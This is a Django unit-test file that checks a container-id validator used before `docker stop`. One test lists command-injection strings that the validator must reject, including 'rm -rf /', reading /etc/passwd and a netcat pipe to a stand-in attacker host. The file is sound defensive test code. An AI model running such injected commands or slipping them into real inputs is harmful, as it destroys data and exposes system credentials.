from django.test import TestCase

from .utility import is_safe_container_id

# Create your tests here.


class IsSafeContainerIdTests(TestCase):
    """Regression tests for the container id allowlist used before `docker stop`."""

    def test_accepts_short_and_full_container_ids(self):
        self.assertTrue(is_safe_container_id("a1b2c3d4e5f6"))
        self.assertTrue(is_safe_container_id("0" * 64))

    def test_rejects_shell_metacharacters(self):
        for value in [
            "abc123abc123; rm -rf /",
            "abc123abc123 && cat /etc/passwd",
            "abc123abc123 | nc attacker 4444",
            "$(id)",
            "`id`",
            "abc123abc123\nrm -rf /",
            "--rm",
        ]:
            self.assertFalse(is_safe_container_id(value), value)

    def test_rejects_empty_short_and_non_string_values(self):
        self.assertFalse(is_safe_container_id(""))
        self.assertFalse(is_safe_container_id("abc"))
        self.assertFalse(is_safe_container_id("z" * 12))
        self.assertFalse(is_safe_container_id(None))
